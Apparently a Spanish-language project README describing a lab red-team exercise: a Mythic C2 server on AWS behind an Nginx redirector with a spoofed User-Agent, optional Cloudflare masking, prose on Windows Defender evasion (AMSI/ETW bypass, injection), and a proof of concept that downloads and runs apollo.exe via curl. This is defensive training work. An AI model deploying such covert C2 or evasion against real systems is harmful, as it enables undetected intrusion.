Introducción

Este proyecto de práctica profesional se enfoca en el diseño, implementación y análisis de una infraestructura de Comando y Control (C2) resiliente y sigilosa, con un énfasis particular en la evasión de soluciones de Detección y Respuesta en el Endpoint (EDR), específicamente Windows Defender, en un entorno de laboratorio controlado. El objetivo principal fue simular tácticas, técnicas y procedimientos (TTPs) de un actor de amenaza persistente avanzada (APT) para comprender mejor las capacidades ofensivas y, consecuentemente, fortalecer las defensas.

Objetivos del Proyecto

•Diseñar e implementar una infraestructura C2 robusta y adaptable.
•Configurar un entorno de laboratorio aislado que replique un escenario de ataque y defensa real.
•Desplegar y parametrizar la plataforma de código abierto Mythic C2.
•Implementar un servidor redirector con Nginx y SSL/TLS para ofuscar el tráfico C2.
•Desarrollar y probar payloads maliciosos con técnicas de evasión para Windows Defender.
•Analizar la efectividad de las técnicas de evasión y las implicaciones de seguridad.

Arquitectura de la Infraestructura C2

La infraestructura se desplegó en Amazon Web Services (AWS) para emular un escenario real de operaciones en la nube, garantizando resiliencia y anonimato. Se compone de los siguientes elementos clave:

1. Servidor C2 (Instancia EC2 - Ubuntu):

•Alojamiento de la plataforma Mythic C2, un framework modular y extensible para la gestión de agentes, creación de payloads y perfiles de comunicación.
•Centraliza el control sobre los sistemas comprometidos y coordina las acciones ofensivas.




2. Servidor Redirector (Instancia EC2 - Ubuntu con Nginx):

•Actúa como un proxy inverso, reenviando el tráfico de los agentes al servidor C2 real.
•Oculta la dirección IP del servidor C2, dificultando la atribución y proporcionando una capa adicional de resiliencia.
•Configurado con Nginx y certificados SSL/TLS (por ejemplo, Let's Encrypt) para cifrar el tráfico y mimetizarse con el tráfico web legítimo.



3. Máquina de Operador (Kali Linux):

•Estación de trabajo desde donde se interactúa con Mythic C2, se gestionan los agentes y se desarrollan los payloads.



4. Máquina Objetivo (Windows 11 con Windows Defender activo):

•Representa el endpoint a comprometer, con Windows Defender Antivirus completamente habilitado y actualizado.
•Crucial para evaluar la efectividad de las técnicas de evasión.



Implementación Técnica Detallada

1. Despliegue de Mythic C2 en el Servidor C2 (Ubuntu en AWS)

La instalación de Mythic C2 se realizó en una instancia EC2 de Ubuntu. Se utilizó Docker y Docker Compose para orquestar los contenedores de Mythic, garantizando un entorno aislado y escalable. La configuración inicial de Mythic se ajustó para escuchar en una dirección IP privada dentro de la VPC de AWS, lo que restringe el acceso directo desde internet y fuerza el uso del redirector.

Comandos de Despliegue:

sudo apt update && sudo apt upgrade -y
sudo apt install -y git docker.io docker-compose
sudo systemctl start docker
sudo systemctl enable docker
sudo usermod -aG docker $USER
newgrp docker # Reiniciar la sesión o ejecutar 'su - $USER' para aplicar cambios

git clone https://github.com/its-a-feature/Mythic.git
cd Mythic
sudo ./install_docker_containers.sh



Una vez completada la instalación, se accede a la interfaz web de Mythic a través de la IP pública del servidor C2 (o un túnel SSH si se accede desde fuera de la VPC ) para configurar los C2 Profiles y generar los payloads.

<img width="1028" height="536" alt="image" src="https://github.com/user-attachments/assets/d04188c5-6678-4fb5-a51e-302b07c318a7" />


2. Configuración del Servidor Redirector con Nginx (Ubuntu en AWS)

El servidor redirector es un componente crítico para la ofuscación y la resiliencia de la infraestructura C2. Se implementó en una instancia EC2 de Ubuntu separada, con una IP Elástica pública asignada, que es el único punto de contacto visible desde internet para los agentes. Nginx se configuró como un proxy inverso para reenviar el tráfico de manera inteligente a la IP privada del servidor C2.

Configuración de Nginx (/etc/nginx/sites-available/default o un archivo de configuración específico):




server {
    listen 80;
    server_name your_domain.com;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    server_name your_domain.com;

    ssl_certificate /etc/letsencrypt/live/your_domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/your_domain.com/privkey.pem;

    location / {
        # Redirección a la IP privada del servidor C2
        proxy_pass https://IP_PRIVADA_DEL_C2:PUERTO_MYTHIC_C2_AGENTES;
        proxy_ssl_verify off; # Deshabilitar verificación SSL para el backend si es necesario (solo en lab )
        
        # Headers para mantener la información de la conexión original y simular tráfico legítimo
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36";

        # Configuración para manejar websockets, crucial para algunos perfiles C2 de Mythic
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_read_timeout 86400s; # Aumentar el timeout para conexiones persistentes
    }
}
<img width="920" height="485" alt="image" src="https://github.com/user-attachments/assets/efd89241-3ee9-4e9c-a8fc-e22fda8f92d2" />



Detalles Técnicos de la Configuración:

•proxy_pass https://IP_PRIVADA_DEL_C2:PUERTO_MYTHIC_C2_AGENTES;: Esta directiva es fundamental. IP_PRIVADA_DEL_C2 es la dirección IP interna asignada a la instancia EC2 donde corre Mythic. PUERTO_MYTHIC_C2_AGENTES es el puerto específico configurado en el C2 Profile de Mythic para escuchar las conexiones entrantes de los agentes (comúnmente 443 o 8080, dependiendo del perfil ).

•proxy_ssl_verify off;: En un entorno de laboratorio, esto puede ser necesario si el certificado SSL del servidor C2 no es de confianza para Nginx. En producción, se buscaría una cadena de confianza completa.

•proxy_set_header Host $host;: Asegura que el servidor C2 reciba el nombre de host original de la solicitud, vital para que Mythic pueda diferenciar entre múltiples dominios o perfiles C2.

•proxy_set_header User-Agent ...;: Permite falsificar el User-Agent para que el tráfico C2 se mimetice con el tráfico de un navegador web legítimo, dificultando la detección basada en firmas de red.

•proxy_set_header Upgrade $http_upgrade; y proxy_set_header Connection "upgrade";: Son esenciales para soportar conexiones WebSocket, utilizadas por algunos C2 Profiles de Mythic para comunicaciones bidireccionales y persistentes.

3. Configuración de C2 Profiles en Mythic

Dentro de Mythic, la creación de C2 Profiles es clave para definir cómo se comunicarán los agentes. Se configuraron perfiles HTTP/HTTPS personalizados para utilizar el dominio del redirector y simular tráfico legítimo. Esto incluye la definición de:

•Host Header: El dominio que el agente usará para conectarse al redirector.

•URI Paths: Rutas específicas para el tráfico C2 que pueden ser filtradas por Nginx.

•User-Agent: Para mimetizar el tráfico con navegadores comunes.

•Encryption: Uso de SSL/TLS para cifrar las comunicaciones.

<img width="1009" height="547" alt="image" src="https://github.com/user-attachments/assets/046fff57-f9f2-40b4-a61e-5415e9becfea" />

<img width="1029" height="539" alt="image" src="https://github.com/user-attachments/assets/6ef77132-c692-406a-abbd-98889e580e20" />


4. Configuración DNS y Cloudflare (Opcional pero recomendado para Operaciones Reales )

Para una mayor ofuscación y gestión de certificados SSL, se puede integrar un servicio como Cloudflare. Esto permite:

•Ocultar la IP pública del redirector: Utilizando el modo proxy de Cloudflare, la IP real del servidor redirector permanece oculta, mostrando solo las IPs de Cloudflare.
•Gestión de Certificados SSL: Cloudflare puede manejar los certificados SSL/TLS, simplificando la configuración en Nginx.
•Reglas de Filtrado y Protección DDoS: Añade una capa adicional de seguridad y resiliencia contra ataques.

<img width="1027" height="539" alt="image" src="https://github.com/user-attachments/assets/41c48305-2f93-48cd-9861-24bd693e336f" />


Metodología de Evasión de EDR (Windows Defender)

La evasión de EDR es un campo complejo que requiere un conocimiento profundo del funcionamiento interno de los sistemas operativos y las soluciones de seguridad. En este proyecto, el agente apollo.exe (generado por Mythic) incorporó técnicas avanzadas para eludir la detección de Windows Defender, que incluyen:

•Ofuscación de Código y Polimorfismo: El payload se generó con técnicas para alterar su firma binaria, dificultando la detección basada en hashes o patrones estáticos por parte de los motores antivirus.
•Evasión de AMSI (Antimalware Scan Interface): AMSI es una interfaz de Windows que permite a las aplicaciones escanear el contenido en memoria en busca de scripts o comandos maliciosos. El agente utilizó técnicas para eludir o deshabilitar temporalmente AMSI en su propio proceso, evitando que el código malicioso sea escaneado antes de su ejecución.
•Evasión de ETW (Event Tracing for Windows): ETW es un mecanismo de registro de eventos de alto rendimiento en Windows, utilizado por EDRs para monitorear la actividad del sistema. El agente implementó métodos para evitar la instrumentación de ETW o para generar eventos que no dispararan las alertas del EDR.
•Inyección de Procesos y Manipulación de Memoria: Técnicas para inyectar código en procesos legítimos o para ejecutar código directamente en memoria, evitando dejar rastros en disco que puedan ser detectados por el EDR.
•Tráfico C2 Mimetizado: Como se mencionó en la configuración de Nginx y los C2 Profiles, el tráfico de comunicación se diseñó para parecerse a tráfico web normal (HTTPS), haciendo que sea difícil de distinguir de la actividad legítima de la red.

Prueba de Concepto (PoC)

Se generó un payload (ej. apollo.exe) desde Mythic C2 y se transfirió a la máquina objetivo Windows 11. La ejecución de este payload se realizó a través de la línea de comandos, simulando un compromiso inicial. A pesar de tener Windows Defender activo y actualizado, el agente logró ejecutarse y establecer un callback (conexión) persistente con la infraestructura C2, demostrando la efectividad de las técnicas de evasión implementadas.


C:\Users\mirei\Downloads>curl http://192.168.17.141:8000/apollo.exe -o apollo.exe
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 2057k  100 2057k    0     0  7913k      0 --:--:-- --:--:-- --:--:-- 7942k
C:\Users\mirei\Downloads>apollo.exe

<img width="1026" height="436" alt="image" src="https://github.com/user-attachments/assets/73535554-fdca-43ae-ad8d-7d6d6e72714e" />




